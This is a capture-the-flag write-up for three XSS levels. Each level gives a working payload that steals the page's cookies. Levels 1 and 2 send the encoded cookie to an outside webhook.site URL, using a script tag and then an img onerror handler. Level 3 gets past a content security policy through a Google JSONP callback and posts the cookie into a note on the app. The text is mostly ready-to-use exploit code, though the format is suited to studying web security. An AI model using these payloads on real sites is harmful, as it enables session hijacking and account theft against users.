## XSS 1

Level 1 has no protections at all.  
Payload:
```html
<script>
  fetch("https://webhook.site/56132684-a245-4f7c-95ee-25f2484e9bf8/"+ btoa(document.cookie));
</script>
```

## XSS 2

In level 2, script tags are stripped. However, image tags with event handlers can be used instead.  
Payload:
```html
<img
  src="random"
  onerror='fetch("https://webhook.site/56132684-a245-4f7c-95ee-25f2484e9bf8/"+ btoa(document.cookie));'
/>
```

## XSS 3

In level 3, there is a restrictive CSP. However, `*.google.com` is allowed, allowing for JSONP to be exploited.  
Even though we have RCE, we are not done as we are unable to connect to other sites. We can leverage the site itself,
using fetch to create a note.

Note: host must be localhost and not the IP because the chrome bot loads pages form localhost.
Payload:
```html
<script
  src='https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://localhost:1238/3/453de579aeb336b827c97c6b71a06903/new",{method: "POST",body:function(){a=new FormData();a.append("title","flag");a.append("content",document.cookie);return new URLSearchParams(a)}()})'>
</script>
```
